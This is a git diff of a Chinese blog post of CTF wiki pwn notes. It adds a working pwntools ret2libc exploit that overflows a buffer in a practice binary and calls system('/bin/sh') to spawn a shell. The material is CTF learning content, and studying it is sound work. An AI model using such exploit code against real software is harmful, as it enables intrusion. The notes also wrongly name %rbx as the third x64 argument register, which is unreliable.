@@ -19,11 +19,13 @@ CTF wiki上的题目都是32位的，32位的和64位的区别在于
 >
 > - X86
 >
->   - 函数的参数放在栈上，在函数返回地址的上方
+>   - 函数的参数放在栈上，在函数返回地址的下方(下方是指：返回地址在低地址，参数在高地址)
 >
 >     ![image-20220109222121679](/assets/img/2022/image-20220109222121679.png){: .normal}
 >
 >     就像这样调用gets前，将参数（这里是待赋值的变量的地址）压入栈（放在esp上）
+>     
+>     ![image-20220123230823721](/assets/img/2022/image-20220123230823721.png)
 >
 > - x64
 >
@@ -38,7 +40,7 @@ CTF wiki上的题目都是32位的，32位的和64位的区别在于
 >   - 寄存器：%rax, arg0(%rdi), arg1(%rsi), arg2(%rbx)   .etc
 >   - 系统调用 syscall
 
-### # ret2text
+### ret2text
 
 通过debug一下
 
@@ -63,7 +65,7 @@ r.sendline(p)
 r.interactive()
 ```
 
-### # ret2shellcode
+### ret2shellcode
 
 ![image-20220123221740937](/assets/img/2022/image-20220123221740937.png)
 
@@ -85,10 +87,6 @@ r.interactive()
 ### ret2syscall
 
 ![image-20220123220116190](/assets/img/2022/image-20220123220116190.png)
-
-查找`/bin/sh`的正确姿势
-
-![image-20220123220910645](/assets/img/2022/image-20220123220910645.png){: .normal}
 
 ![image-20220123221254741](/assets/img/2022/image-20220123221254741.png)
 
@@ -117,6 +115,36 @@ p += p32(int_0x80)
 r.sendline(p)
 r.interactive()
 ```
+
+
+
+### ret2libc1
+
+![image-20220123230431106](/assets/img/2022/image-20220123230431106.png)
+
+```python
+from pwn import *
+
+
+r = process('./ret2libc1')
+
+r.recvuntil('RET2LIBC >_<\n')
+
+bin_sh = 0x08048720 # /bin/sh
+system = 0x8048460 # <system@plt>
+
+p = 'a'*(0x6c+0x4)
+p += p32(system)
+p += 'b'*4
+p += p32(bin_sh)
+
+
+r.sendline(p)
+
+r.interactive()
+```
+
+
 
 ## 中级ROP
 
